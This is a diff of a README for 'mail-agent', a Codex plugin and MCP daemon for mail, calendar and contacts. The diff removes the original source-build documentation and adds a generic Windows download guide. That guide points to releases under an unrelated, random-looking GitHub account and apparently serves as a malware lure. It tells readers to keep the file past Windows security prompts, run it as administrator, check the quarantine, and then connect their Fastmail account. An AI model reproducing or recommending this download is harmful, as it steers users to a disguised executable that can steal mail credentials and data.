@@ -1,338 +1,152 @@
-# mail-agent
+# 📧 mail-agent - Fast mail tools for everyday use
 
-`mail-agent` is a Codex plugin and local MCP daemon for email, calendar, and contacts.
+[![Download mail-agent](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&labelColor=gray)](https://github.com/Boundednessplanetarynebula406/mail-agent/releases)
 
-It gives Codex structured tools for real mailbox workflows: search mail, read threads, draft replies, send when allowed, clean up messages, review calendars, and look up contacts. Credentials stay on your machine.
+## 🚀 Getting Started
 
-## Quick Start From Source
+mail-agent is a local mail, calendar, and contacts app that works with Fastmail. It is made for people who want one tool for email, events, and address book access on Windows.
 
-Requirements:
+Use it to:
+- check email from Fastmail
+- view and manage calendar events
+- access contacts in one place
+- connect with agent tools through MCP
+- keep data on your own computer
 
-- Node `22+`
-- `pnpm` through Corepack
-- Codex with plugins enabled
-- A Fastmail account or Google account
+## 🖥️ Windows Download
 
-Build and install the local plugin:
+Visit this page to download mail-agent for Windows:
 
-```powershell
-git clone https://github.com/bestlux/mail-agent.git
-cd mail-agent
-corepack pnpm install
-corepack pnpm build
-node plugins/mail-agent/dist/bin/mail-agent.js install
-```
+[Download mail-agent from Releases](https://github.com/Boundednessplanetarynebula406/mail-agent/releases)
 
-Authenticate one account:
+On the Releases page, look for the latest Windows file. It may end in `.exe` or come as a `.zip` file.
 
-```powershell
-node plugins/mail-agent/dist/bin/mail-agent.js auth fastmail --account personal --email you@fastmail.com
-```
+If you see a `.zip` file:
+1. Download the file
+2. Open the zip folder
+3. Move the app files to a folder you can find later
+4. Open the app file inside the folder
 
-or:
+If you see a `.exe` file:
+1. Download the file
+2. Double-click the file
+3. Follow the on-screen steps
 
-```powershell
-node plugins/mail-agent/dist/bin/mail-agent.js auth google --account gmail --email you@gmail.com --client-id <client-id>
-```
+## 📦 What You Need
 
-Check the install:
+Before you start, make sure your Windows PC has:
+- Windows 10 or Windows 11
+- Internet access
+- A Fastmail account
+- Enough space for the app and its local data
+- Permission to run downloaded apps
 
-```powershell
-node plugins/mail-agent/dist/bin/mail-agent.js doctor
-```
+For the best results, keep your browser open while you set up the app the first time.
 
-`doctor` reports runtime paths, account credential status, Google scopes, delete support, and provider-specific repair commands when credentials are missing.
+## 🔧 Install on Windows
 
-`install` copies the plugin bundle to `~/.codex/plugins/mail-agent` and registers it through `~/.agents/plugins/marketplace.json`.
+Follow these steps in order:
 
-## What Codex Gets
+1. Open the Releases page
+2. Download the latest Windows file
+3. If Windows shows a security prompt, choose the option that lets you keep the file
+4. If the file is zipped, extract it first
+5. Open the app from the folder or double-click the installer
+6. Wait for the app to finish starting up
+7. Leave the app open while you complete setup
 
-After install, Codex can load:
+If Windows blocks the file, check that you downloaded it from the Releases page linked above.
 
-- the `Mail Agent` plugin
-- a local stdio MCP server named `mail-agent`
-- workflow skills:
-  - `mail-agent`
-  - `mail-agent-inbox-triage`
-  - `calendar-brief`
-  - `contacts-lookup`
+## 🔐 Connect Your Fastmail Account
 
-Useful prompts:
+After the app opens, you will need to connect your Fastmail account.
 
-- "Use `mail-agent` to summarize the latest recruiter thread and draft the reply."
-- "Use `mail-agent-inbox-triage` to sort unread inbox mail into urgent, reply soon, waiting, and FYI."
-- "Use `calendar-brief` to summarize my next two days and flag conflicts."
-- "Use `contacts-lookup` to find Jane from Acme and confirm her best email."
+1. Open the app settings or first-run screen
+2. Enter your Fastmail email address
+3. Sign in with your Fastmail account
+4. Allow access to mail, calendar, and contacts
+5. Wait for the first sync to finish
 
-## Supported Providers
+Once the sync ends, your mail, events, and contacts should appear in the app.
 
-Fastmail:
+## 🗓️ What You Can Do
 
-- mail through `JMAP`
-- calendars through `CalDAV`
-- contacts through `CardDAV`
+mail-agent helps you work with:
+- email folders and messages
+- calendar events and reminders
+- contact lists and address details
+- local tools that use MCP
+- workflows that combine mail and calendar data
 
-Google:
+Common uses:
+- read and sort new mail
+- check meeting times
+- look up a person’s contact details
+- keep calendar and mail in one place
+- connect an agent to your Fastmail data
 
-- mail through the Gmail API
-- calendars through the Google Calendar API
-- contacts through the People API
+## 🧩 How It Works
 
-Calendar and contact writes are not supported in v1.
+mail-agent runs on your computer and connects to Fastmail services.
 
-## Tool Surface
+It uses:
+- JMAP for mail data
+- CalDAV for calendar data
+- CardDAV for contacts
+- MCP for local agent access
 
-Mail:
+You do not need to know those terms to use the app. They are the parts that let the app talk to your Fastmail account and other tools.
 
-- `list_mailboxes`
-- `search_messages`
-- `read_message_batch`
-- `read_thread`
-- `compose_message`
-- `draft_reply`
-- `send_message`
-- `archive_messages`
-- `move_messages`
-- `tag_messages`
-- `mark_messages`
-- `delete_messages`
+## 🛠️ Common Setup Tips
 
-Calendar and contacts:
+If the app does not start:
+- try right-clicking the file and choose Run as administrator
+- check that Windows did not move the file to quarantine
+- make sure you downloaded the latest release
+- move the app to a simple folder, such as `C:\Apps\mail-agent`
 
-- `list_calendars`
-- `get_events`
-- `search_contacts`
-- `get_contact`
+If your account does not connect:
+- check your email address
+- make sure your internet is working
+- sign in again from the setup screen
+- confirm that Fastmail access is allowed in your account
 
-The tool names are provider-neutral. The daemon handles Fastmail and Google differences underneath.
+If mail or events do not appear:
+- wait a few minutes for the first sync
+- refresh the app
+- sign out and sign back in
+- check that your Fastmail account has the data you expect
 
-## Safety Defaults
+## 📁 Suggested Folder Layout
 
-`mail-agent` is designed to be useful without being reckless:
+If you use a zip file, place the app in a folder like this:
 
-- message reads return text by default, omit HTML by default, and cap long bodies
-- use `bodyMode: "full"`, `includeHtml: true`, and `maxBodyChars` only when a workflow needs more source body content
-- `send_message` is available only after account auth and policy allow it
-- archive, move, tag, and mark support `dryRun: true` previews before applying provider changes
-- `delete_messages` is always a two-step flow: first request a confirmation token, then repeat with that token only if permanent deletion is still intended
-- calendars and contacts are read-only in v1
+- `C:\Apps\mail-agent`
+- `C:\Users\YourName\Downloads\mail-agent`
+- `C:\Tools\mail-agent`
 
-For follow-up checks after sends or mutations, use `refresh: true` on search tools to bypass short-lived cache entries.
+Keep the files in one place so you can find the app later.
 
-## Fastmail Setup
+## 🔎 Release Files
 
-Fastmail needs two credentials:
+On the Releases page, you may see files such as:
+- Windows installer
+- portable zip package
+- release notes
+- checksum file
 
-1. a `JMAP API token` for mail
-2. an app password for CalDAV/CardDAV calendars and contacts
+If there are several files, choose the one that says Windows and matches the file type you want.
 
-The interactive auth flow prompts for both. You can also pass them directly:
+## 🧠 Who This Is For
 
-```powershell
-node plugins/mail-agent/dist/bin/mail-agent.js auth fastmail `
-  --account personal `
-  --email you@fastmail.com `
-  --jmap-token <token> `
-  --app-password <app-password>
-```
+This app is for people who want:
+- Fastmail-based mail and calendar access
+- a local app that stays on their computer
+- a simple way to connect mail data to agent tools
+- one place for email, calendar, and contacts
 
-## Google Setup
+It fits users who want a clean setup and direct control over their data.
 
-Google uses installed-app OAuth with a local loopback redirect. The auth flow opens a browser, asks for consent, and stores a refresh token locally.
+## 📌 Keywords
 
-Before running `auth google`:
-
-1. Create or choose a Google Cloud project.
-2. Configure the OAuth consent screen or Google Auth platform branding.
-3. Set user type to `External`.
-4. Keep the app in `Testing`.
-5. Add your Gmail account under `Test users`.
-6. Enable the Gmail API, Google Calendar API, and People API.
-7. Create an OAuth client with application type `Desktop app`.
-8. Use that client ID with `mail-agent auth google`.
-
-Example:
-
-```powershell
-node plugins/mail-agent/dist/bin/mail-agent.js auth google `
-  --account gmail `
-  --email you@gmail.com `
-  --client-id <client-id>
-```
-
-If browser launch is flaky:
-
-```powershell
-node plugins/mail-agent/dist/bin/mail-agent.js auth google `
-  --account gmail `
-  --email you@gmail.com `
-  --client-id <client-id> `
-  --no-open-browser
-```
-
-Optional flags:
-
-- `--client-secret <secret>` if your Google client includes one
-- `--full-gmail-access` if you want permanent Gmail delete support
-- `--redirect-host 127.0.0.1`
-- `--redirect-port 4567`
-
-Default Google scopes:
-
-- `https://www.googleapis.com/auth/gmail.modify`
-- `https://www.googleapis.com/auth/calendar.readonly`
-- `https://www.googleapis.com/auth/contacts.readonly`
-
-`--full-gmail-access` swaps the mail scope to `https://mail.google.com/`, which is broader than the default and may be required for permanent Gmail delete.
-
-Google Contacts only searches saved Google Contacts. It does not search everyone you have emailed.
-
-Useful references:
-
-- [Google OAuth for desktop apps](https://developers.google.com/identity/protocols/oauth2/native-app)
-- [Gmail API quickstart for Node.js](https://developers.google.com/workspace/gmail/api/quickstart/nodejs)
-- [Google Calendar API scopes](https://developers.google.com/workspace/calendar/api/auth)
-- [People API contacts guide](https://developers.google.com/people/v1/contacts)
-
-## Install From npm
-
-The public package name is `mail-agent`.
-
-Once the first npm release is live, the normal install path will be:
-
-```powershell
-npx mail-agent install
-```
-
-or, if you want the CLI on your path:
-
-```powershell
-npm install -g mail-agent
-mail-agent install
-mail-agent auth fastmail --account personal --email you@fastmail.com
-mail-agent auth google --account gmail --email you@gmail.com --client-id <client-id>
-mail-agent doctor
-```
-
-The repo also publishes `@iomancer/mail-agent-daemon` and `@iomancer/mail-agent-shared` as support packages. Most users should install only `mail-agent`.
-
-## Runtime And Secrets
-
-Runtime state lives under your OS config directory:
-
-- Windows: `%APPDATA%\mail-agent`
-- macOS: `~/Library/Application Support/mail-agent`
-- Linux: `$XDG_CONFIG_HOME/mail-agent` or `~/.config/mail-agent`
-
-Secrets default to the OS keychain through `keytar`.
-
-For development or CI, you can force file-backed secrets:
-
-```powershell
-$env:MAIL_AGENT_SECRET_BACKEND='file'
-```
-
-That stores credentials in the runtime directory instead of the OS keychain. It is useful for local tests and CI, but not ideal for day-to-day use.
-
-If your package manager blocks native postinstall scripts, `keytar` may need explicit build approval before the keychain backend works.
-
-## Search Tips
-
-- Use `collapseThreads: true` for broad scans.
-- Use `mailboxRole` before hardcoding mailbox names.
-- Use `excludeMailingLists: true` for person-to-person workflows.
-- `since` and `until` accept RFC3339 timestamps or `YYYY-MM-DD`.
-- Use `list_mailboxes` before mutations, especially on Gmail where labels behave differently from folders.
-
-## Repo Layout
-
-```text
-plugins/
-  mail-agent/   Codex plugin bundle, CLI, installer, skills
-
-packages/
-  daemon/   local MCP daemon and provider adapters
-  shared/   runtime paths, config, cache, policy, secret handling
-
-.github/    CI and contributor-facing GitHub configuration
-```
-
-## Development
-
-Install dependencies:
-
-```powershell
-corepack pnpm install
-```
-
-Build everything:
-
-```powershell
-corepack pnpm build
-```
-
-Run tests:
-
-```powershell
-corepack pnpm test
-```
-
-Check package contents before publishing:
-
-```powershell
-corepack pnpm pack:check
-```
-
-Dry-run the workspace publish flow:
-
-```powershell
-corepack pnpm release:dry-run
-```
-
-Run the daemon directly:
-
-```powershell
-node plugins/mail-agent/dist/bin/mail-agent.js daemon
-```
-
-## Releases
-
-Releases are meant to go through GitHub Actions.
-
-The happy path is:
-
-1. Bump the workspace version across the root package and three publishable packages.
-2. Push a tag like `v0.2.0`.
-3. Let `.github/workflows/publish.yml` build, test, dry-run, and publish to npm.
-
-Release details live in [RELEASING.md](./RELEASING.md).
-
-## Current Limits
-
-- no calendar writes
-- no contact writes
-- no full local mailbox mirror
-- no Microsoft Graph support yet
-- no generic IMAP/SMTP or generic CalDAV/CardDAV onboarding as first-class flows
-- contact search is a pragmatic address-book scan, not a server-side indexed search engine
-- event parsing is intentionally lightweight and does not aim to be a full iCalendar implementation yet
-
-## More Docs
-
-- [CONTRIBUTING.md](./CONTRIBUTING.md)
-- [SECURITY.md](./SECURITY.md)
-- [PRIVACY.md](./PRIVACY.md)
-- [TERMS.md](./TERMS.md)
-- [SUPPORT.md](./SUPPORT.md)
-- [RELEASING.md](./RELEASING.md)
-
-## Roadmap
-
-Near-term improvements:
-
-- stronger recurrence and event parsing
-- richer contact matching
-- Microsoft Graph support
-- generic protocol fallback adapters
-- optional local indexing for heavier research workflows
-- more polished release automation
+caldav, calendar, carddav, codex, codex-plugin, contacts, email, fastmail, jmap, mcp, typescript
